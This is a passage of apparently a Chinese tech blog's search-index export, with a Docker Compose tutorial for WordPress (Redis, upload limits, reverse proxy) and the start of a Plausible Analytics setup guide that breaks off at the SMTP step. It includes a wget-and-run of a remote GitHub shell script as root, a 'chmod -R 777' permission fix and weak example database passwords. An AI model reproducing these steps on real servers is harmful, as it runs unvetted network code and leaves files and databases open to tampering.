      </tags>
  </entry>
  <entry>
    <title>docker 搭建 WordPress</title>
    <url>/posts/7b5e1689/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>GitHub原项目地址：<a href="https://github.com/WordPress/WordPress">https://github.com/WordPress/WordPress</a></p>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>安装好Docker、Docker-compose</p>
<p><a href="https://macin.top/posts/582e0af7/?highlight=docker">ubuntu&#x2F;debian 安装 docker | 赛博空间 (macin.top)</a></p>
<p><a href="https://macin.top/posts/1efa1fcf/?highlight=docker">centos 安装 docker | 赛博空间 (macin.top)</a></p>
<p><a href="https://macin.top/posts/5f933334/?highlight=docker+compose">docker-compose常用命令 | 赛博空间 (macin.top)</a></p>
<p>【非必需】提前安装好宝塔面板海外版本aapanel，并安装好Nginx（<a href="https://macin.top/posts/22657a29/?highlight=%E5%AE%9D%E5%A1%94">教程</a>)</p>
<p>【非必需本教程采用】安装好Nginx Proxy Manager （<a href="https://macin.top/posts/3ecd216c/?highlight=nginx">教程</a>）</p>
<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="服务器初始设置，参考"><a href="#服务器初始设置，参考" class="headerlink" title="服务器初始设置，参考"></a>服务器初始设置，参考</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i <span class="comment"># 切换到root用户</span></span><br><span class="line"></span><br><span class="line">apt update -y  <span class="comment"># 升级packages</span></span><br><span class="line"></span><br><span class="line">apt install wget curl sudo vim git  <span class="comment"># Debian系统比较干净，安装常用的软件</span></span><br></pre></td></tr></table></figure>

<p>创建一下安装的目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/wordpress</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress</span><br><span class="line"></span><br><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>docker-compose.yml改自<a href="https://hub.docker.com/_/wordpress">wordpress - Official Image | Docker Hub</a>，内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:80</span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db</span><br><span class="line">      WORDPRESS_DB_USER: exampleuser</span><br><span class="line">      WORDPRESS_DB_PASSWORD: examplepass</span><br><span class="line">      WORDPRESS_DB_NAME: exampledb</span><br><span class="line">    volumes:</span><br><span class="line">      - /root/data/docker_data/wordpress/data:/var/www/html</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: exampledb</span><br><span class="line">      MYSQL_USER: exampleuser</span><br><span class="line">      MYSQL_PASSWORD: examplepass</span><br><span class="line">      MYSQL_RANDOM_ROOT_PASSWORD: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - /root/data/docker_data/wordpress/db:/var/lib/mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">#volumes:</span></span><br><span class="line"><span class="comment">#  wordpress:</span></span><br><span class="line"><span class="comment">#  db:</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：VPS的内存最好大于1G，可以再设置1G的SWAP。</p>
</blockquote>
<p>设置SWAP可以用脚本:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O box.sh https://raw.githubusercontent.com/BlueSkyXN/SKY-BOX/main/box.sh &amp;&amp; <span class="built_in">chmod</span> +x box.sh &amp;&amp; clear &amp;&amp; ./box.sh</span><br></pre></td></tr></table></figure>

<p>没问题的话，<code>ctrl+x</code>退出，按<code>y</code>保存，<code>enter</code>确认。</p>
<p>查看端口是否被占用，输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i:8080  <span class="comment">#查看8080端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure>

<p>如果出现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装lsof</span></span><br></pre></td></tr></table></figure>

<p>如果端口没有被占用，可以运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<p>访问：<code>http:服务ip:8080</code> 即可。</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>1、不知道服务器IP，可以直接在命令行输入：<code>curl ip.sb</code>，会显示当前服务器的IP。</p>
<p>2、遇到访问不了的情况，请在宝塔面板的防火墙和服务商的后台防火墙里打开对应端口。</p>
</blockquote>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose pull    <span class="comment"># 拉取最新的镜像</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d   <span class="comment"># 重新更新当前镜像</span></span><br></pre></td></tr></table></figure>

<p>利用Docker-compose搭建的应用，更新非常容易～</p>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i  <span class="comment"># 切换到root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose down    <span class="comment"># 停止容器，此时不会删除映射到本地的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/wordpress  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure>

<p>利用Docker-compose搭建的应用，删除也非常容易～</p>
<h1 id="反向代理（必须）"><a href="#反向代理（必须）" class="headerlink" title="反向代理（必须）"></a>反向代理（必须）</h1><blockquote>
<p><strong>此项目和别的项目不同，必须采用https形式，否则浏览器无法加密，无法使用。</strong></p>
</blockquote>
<h2 id="利用Nginx-Proxy-Manager"><a href="#利用Nginx-Proxy-Manager" class="headerlink" title="利用Nginx Proxy Manager"></a>利用Nginx Proxy Manager</h2><p>在添加反向代理之前，确保你已经完成了域名解析，不会的可以看这个：<strong>域名一枚，并做好解析到服务器上</strong></p>
<p>之后，登陆Nginx Proxy Manager（<a href="https://macin.top/posts/3ecd216c/?highlight=nginx">docker-compose 搭建 nginx proxy manager | 赛博空间 (macin.top)</a>）</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>Nginx Proxy Manager（以下简称NPM）会用到<code>80</code>、<code>443</code>端口，所以本机不能占用（比如原来就有Nginx）</p>
</blockquote>
<p>直接丢几张图：</p>
<p><img src="/img/docker-wordpress/1.webp" alt="image-20220502123517401"><br><img src="/img/docker-wordpress/2.webp" alt="image-20220514103342515"></p>
<blockquote>
<p>注意填写对应的<code>域名</code>、<code>IP</code>和<code>端口</code>，按文章来的话，应该是<code>8080</code></p>
</blockquote>
<p><strong>IP填写：</strong></p>
<p>如果<code>Nginx Proxy Manager</code>和<code>WordPress</code>在同一台服务器上，可以在终端输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr show docker0</span><br></pre></td></tr></table></figure>

<p>查看对应的Docker容器内部IP。</p>
<p>否则直接填<code>cryptgeon所在的服务器IP</code>就行。</p>
<p><img src="/img/docker-wordpress/3.webp" alt="image-20220403104353185"></p>
<p>再次打开，勾选这些：</p>
<p><img src="/img/docker-wordpress/4.webp" alt="image-20220514103416636"></p>
<p>然后就可以用域名来安装访问了。</p>
<h1 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h1><h2 id="出现上传的文件尺寸超过php-ini中定义的upload-max-filesize值"><a href="#出现上传的文件尺寸超过php-ini中定义的upload-max-filesize值" class="headerlink" title="出现上传的文件尺寸超过php.ini中定义的upload_max_filesize值"></a>出现上传的文件尺寸超过<code>php.ini</code>中定义的<code>upload_max_filesize</code>值</h2><p>默认php设置的上传文件大小为2M，我们需要调整一下。参考：<a href="https://github.com/docker-library/wordpress/issues/375">https://github.com/docker-library/wordpress/issues/375</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress</span><br><span class="line"></span><br><span class="line">nano uploads.ini</span><br></pre></td></tr></table></figure>

<p>输入下面的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file_uploads = On</span><br><span class="line">upload_max_filesize = 256M    <span class="comment">#可以自己设置大小</span></span><br><span class="line">post_max_size = 256M  <span class="comment">#可以自己设置大小</span></span><br></pre></td></tr></table></figure>

<p><code>ctrl+x</code>，<code>y</code>，<code>enter</code> 确认。</p>
<p>修改<code>docker-compose</code>文件，<code>volume</code>下面加入一句：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- ./uploads.ini:/usr/local/etc/php/conf.d/uploads.ini</span><br></pre></td></tr></table></figure>

<p>完整的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - 8080:80</span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db</span><br><span class="line">      WORDPRESS_DB_USER: exampleuser</span><br><span class="line">      WORDPRESS_DB_PASSWORD: examplepass</span><br><span class="line">      WORDPRESS_DB_NAME: exampledb</span><br><span class="line">    volumes:</span><br><span class="line">      - /root/data/docker_data/wordpress/data:/var/www/html</span><br><span class="line">      - /root/data/docker_data/wordpress/uploads.ini:/usr/local/etc/php/conf.d/uploads.ini</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: exampledb</span><br><span class="line">      MYSQL_USER: exampleuser</span><br><span class="line">      MYSQL_PASSWORD: examplepass</span><br><span class="line">      MYSQL_RANDOM_ROOT_PASSWORD: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - /root/data/docker_data/wordpress/db:/var/lib/mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">#volumes:</span></span><br><span class="line"><span class="comment">#  wordpress:</span></span><br><span class="line"><span class="comment">#  db:</span></span><br></pre></td></tr></table></figure>

<p>重新启动容器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<p>查看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> 你的wp容器<span class="built_in">id</span> php -i | grep upload</span><br></pre></td></tr></table></figure>

<h2 id="出现“因为我们不能复制一些文件，升级未被安装，这通常是因为存在不一致的文件权限”的错误"><a href="#出现“因为我们不能复制一些文件，升级未被安装，这通常是因为存在不一致的文件权限”的错误" class="headerlink" title="出现“因为我们不能复制一些文件，升级未被安装，这通常是因为存在不一致的文件权限”的错误"></a>出现“因为我们不能复制一些文件，升级未被安装，这通常是因为存在不一致的文件权限”的错误</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress/data</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> -R 777 wp-content</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>

<h2 id="上传主题，出现“您点击的链接已过期”"><a href="#上传主题，出现“您点击的链接已过期”" class="headerlink" title="上传主题，出现“您点击的链接已过期”"></a>上传主题，出现“您点击的链接已过期”</h2><p>解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress/data</span><br><span class="line"></span><br><span class="line">vim .htaccess</span><br></pre></td></tr></table></figure>

<p>在<code>.htaccess</code>最后面加上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php_value max_execution_time 300</span><br><span class="line">php_value upload_max_filesize 256M</span><br><span class="line">php_value post_max_size 256M</span><br><span class="line">php_value memory_limit 128M</span><br><span class="line">php_value max_input_vars 5000</span><br></pre></td></tr></table></figure>

<p><img src="/img/docker-wordpress/5.webp" alt="5"></p>
<p>这样就能成功上传了～</p>
<p><img src="/img/docker-wordpress/6.webp" alt="6"></p>
<h1 id="redis（不用redis的可以跳过）"><a href="#redis（不用redis的可以跳过）" class="headerlink" title="redis（不用redis的可以跳过）"></a>redis（不用redis的可以跳过）</h1><p>默认放在<code>/root/data/docker_data/wordpress</code>文件夹下。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span> <span class="comment"># 使用mysql镜像，不建议修改版本号，后续如果要升级，千万记得备份数据库</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">wordpress-db</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--max-binlog-size=200M</span> <span class="string">--expire-logs-days=2</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">rootpassword</span> <span class="comment"># 这里是上面的root密码</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">rootpassword</span> <span class="comment"># 这里是原来的密码</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;./db:/var/lib/mysql&#x27;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">default</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">app:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wordpress:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">wordpress-app</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:80</span>  <span class="comment"># 按需修改,左边的8080可以改成服务器上没有用过的端口</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_HOST:</span> <span class="string">db</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_NAME:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">wordpress</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="string">rootp1ass2wo3rd</span> <span class="comment"># 按需修改</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;./app:/var/www/html&#x27;</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db:db</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">default</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">wordpress-redis</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./redis-data:/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">default</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">default:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">wordpress</span></span><br></pre></td></tr></table></figure>

<p>redis设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress/app/wp-config.php</span><br></pre></td></tr></table></figure>

<p>找到<code>DB_COLLATE</code> 在<code>define( &#39;DB_COLLATE&#39;, &#39;XXX...&#39;);</code> 后添加如下内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** Redis Object Cache */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_REDIS_HOST&#x27;</span>, <span class="string">&#x27;wordpress-redis&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_REDIS_DATABASE&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/docker-wordpress/9.webp" alt="image-20230809143203592"></p>
<p>重启docker之后，在后台安装<code>Redis Object Cache</code>插件,直接点击<code>Enable Object Cache</code>即可。</p>
<p><img src="/img/docker-wordpress/7.webp" alt="image-20230809143621537"></p>
<p>右键查看网页源代码，最后面出现这个说明搞定了！</p>
<p><img src="/img/docker-wordpress/8.webp" alt="image-20230809143725049"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Retrieved 3855 objects (507 KB) from Redis using Predis (v2.1.2).</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="上传文件大小限制："><a href="#上传文件大小限制：" class="headerlink" title="上传文件大小限制："></a>上传文件大小限制：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress/app/</span><br><span class="line">vim php.ini</span><br></pre></td></tr></table></figure>

<p>填入下面内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload_max_filesize = 512M</span><br><span class="line">post_max_size = 512M</span><br><span class="line">memory_limit = 1024M</span><br></pre></td></tr></table></figure>

<p>翻译过来就是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">最大的文件上传:    512M</span><br><span class="line">最大的执行大小:    512M</span><br><span class="line">内存限制:    1G</span><br></pre></td></tr></table></figure>

<p>英文输入法下，按冒号+wq保存退出之后，修改一下<code>php.ini</code>的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chown</span> -R 33:33 php.ini</span><br></pre></td></tr></table></figure>

<p>然后重启一下服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/wordpress</span><br><span class="line"></span><br><span class="line">docker-compose up -d  <span class="comment"># 或者 docker compose up -d</span></span><br></pre></td></tr></table></figure>

<p>这下上传主题或者文件啥的就没问题了。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><p><a href="https://github.com/WordPress/WordPress">https://github.com/WordPress/WordPress</a></p>
</li>
<li><p><a href="https://hub.docker.com/_/wordpress">https://hub.docker.com/_/wordpress</a></p>
</li>
<li><p><a href="https://github.com/docker-library/wordpress/issues/375">https://github.com/docker-library/wordpress/issues/375</a></p>
</li>
<li><p><a href="https://blognas.hwb0307.com/linux/docker/238">https://blognas.hwb0307.com/linux/docker/238</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>wordpress</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>docker搭建plausible流量统计集成谷歌搜索控制台(旧版)</title>
    <url>/posts/d5df7017/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><blockquote>
<p>Plausible Analytics 是一个简单、开源、轻量级（&lt; 1 KB）且注重隐私的 Google Analytics 替代品。Plausible 被超过10,000个付费订阅用户信任，用于提供他们网站和业务洞察力。我们完全独立、自筹资金并自给自足。</p>
</blockquote>
<p>来自<a href="https://plausible.io/docs">官方Docs</a></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>支持docker一键部署，轻量级Docker镜像（使用Alpine Linux）</li>
<li>支持谷歌API，链接谷歌分析、谷歌关键词工具</li>
<li>支持自定义事件</li>
</ul>
<h1 id="安装-Docker-与-Nginx-Proxy-Manager"><a href="#安装-Docker-与-Nginx-Proxy-Manager" class="headerlink" title="安装 Docker 与 Nginx Proxy Manager"></a>安装 Docker 与 Nginx Proxy Manager</h1><p>可以直接参考这篇内容：</p>
<p><a href="https://macin.top/posts/3ecd216c/?highlight=nginx">docker-compose 搭建 nginx proxy manager | 赛博空间 (macin.top)</a></p>
<h1 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h1><h2 id="创建安装目录"><a href="#创建安装目录" class="headerlink" title="创建安装目录"></a>创建安装目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#管理员权限</span></span><br><span class="line">sudo -i</span><br><span class="line"><span class="comment">#新建文件夹和路径</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/plausible</span><br><span class="line"><span class="comment">#进入文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/plausible</span><br><span class="line"><span class="comment">#克隆项目</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/plausible/hosting</span><br><span class="line"><span class="comment">#进入文件夹</span></span><br><span class="line"><span class="built_in">cd</span> hosting</span><br><span class="line"><span class="comment">#编辑docker-compose内容</span></span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure>

<p>英文输入法下，按 <code>i</code>进入编辑</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">bytemark/smtp</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">plausible_db:</span></span><br><span class="line">    <span class="comment"># supported versions are 12, 13, and 14</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:14-alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./db-data:/var/lib/postgresql/data</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_PASSWORD=postgres</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">plausible_events_db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">clickhouse/clickhouse-server:23.3.7.5-alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./event-data:/var/lib/clickhouse</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./clickhouse/clickhouse-config.xml:/etc/clickhouse-server/config.d/logging.xml:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./clickhouse/clickhouse-user-config.xml:/etc/clickhouse-server/users.d/logging.xml:ro</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nofile:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">262144</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">262144</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">plausible:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">plausible/analytics:v2.0</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">-c</span> <span class="string">&quot;sleep 10 &amp;&amp; /entrypoint.sh db createdb &amp;&amp; /entrypoint.sh db migrate &amp;&amp; /entrypoint.sh run&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">plausible_db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">plausible_events_db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mail</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8090</span><span class="string">:8000</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">plausible-conf.env</span></span><br></pre></td></tr></table></figure>

<p>修改好之后，注意切换成英文输入法，然后按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出</p>
<h2 id="生成一串随机字符，写到下面的-SECRET-KEY-BASE-里"><a href="#生成一串随机字符，写到下面的-SECRET-KEY-BASE-里" class="headerlink" title="生成一串随机字符，写到下面的 SECRET_KEY_BASE 里"></a>生成一串随机字符，写到下面的 <code>SECRET_KEY_BASE</code> 里</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成随机秘钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 64 | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> ; <span class="built_in">echo</span></span><br><span class="line"><span class="comment">#示例输出</span></span><br><span class="line">FhNHzoWJyoQgT21RsFQG+KUzJ/o5YbKsszc6CMOArA0OXxjZ763oCGiItOPlKJAfIQO0uov8xt8p5k+MqtmtOQ==</span><br></pre></td></tr></table></figure>

<h2 id="打开环境配置文件："><a href="#打开环境配置文件：" class="headerlink" title="打开环境配置文件："></a>打开环境配置文件：</h2><p><code>vim plausible-conf.env</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASE_URL=访问plausible的域名，例如：https://fenxi.xxx.com</span><br><span class="line">SECRET_KEY_BASE=填刚刚生成的那个密钥</span><br><span class="line">DISABLE_REGISTRATION=<span class="literal">true</span>  <span class="comment"># 禁止用户注册</span></span><br></pre></td></tr></table></figure>

<p>修改好之后，注意切换成英文输入法，然后按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出。</p>
<p>更多参数配置，请看文档：<a href="https://plausible.io/docs/self-hosting-configuration">https://plausible.io/docs/self-hosting-configuration</a></p>
<h2 id="查看端口是否被占用"><a href="#查看端口是否被占用" class="headerlink" title="查看端口是否被占用"></a>查看端口是否被占用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i:8000  <span class="comment">#查看 8000 端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure>

<p>如果啥也没出现，表示端口未被占用，我们可以继续下面的操作了</p>
<p>如果出现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装 lsof</span></span><br></pre></td></tr></table></figure>

<p>被占用就修改一下端口，比如改成 <code>8081</code>，注意 docker 命令行里和防火墙端口放行都要改</p>
<p>输入 <code>http://ip:8000</code> 访问</p>
<h1 id="添加发信邮箱【可选】"><a href="#添加发信邮箱【可选】" class="headerlink" title="添加发信邮箱【可选】"></a>添加发信邮箱【可选】</h1><p>使用外部 SMTP 发信邮箱，编辑 Plausible 环境变量文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim plausible-conf.env</span><br></pre></td></tr></table></figure>

<p>添加下面内容</p>
